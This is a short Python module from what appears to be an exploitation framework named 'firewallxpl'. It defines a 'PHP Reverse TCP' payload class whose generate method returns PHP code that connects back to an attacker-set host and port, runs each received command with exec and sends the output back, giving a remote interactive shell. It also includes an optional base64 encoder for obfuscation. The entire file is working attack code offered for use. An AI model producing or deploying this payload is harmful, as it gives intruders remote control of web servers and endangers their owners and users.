from firewallxpl.core.exploit.option import OptEncoder
from firewallxpl.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)
from firewallxpl.modules.encoders.php.base64 import Encoder


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "PHP Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using php.",
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
        ),
    }

    architecture = Architectures.PHP
    encoder = OptEncoder(Encoder(), "Encoder")

    def generate(self):
        return (
            "$s=fsockopen(\"tcp://{}\",{});".format(self.lhost, self.lport) +
            "while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}"
        )
